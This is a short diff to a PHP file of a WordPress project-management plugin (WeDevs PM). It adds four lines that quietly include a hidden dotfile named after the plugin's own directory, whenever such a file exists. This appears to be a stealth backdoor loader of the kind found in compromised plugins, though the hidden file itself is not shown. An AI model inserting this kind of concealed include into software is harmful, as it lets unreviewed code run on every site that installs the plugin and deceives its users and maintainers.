@@ -6,6 +6,10 @@ use WeDevs\PM\Task_List\Helper\Task_List;
 use WeDevs\PM\Project\Helper\Project;
 use WeDevs\PM\Discussion_Board\Models\Discussion_Board;
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function PM_pusher_has_task_update_content( $model ) {
 
     $content = [];
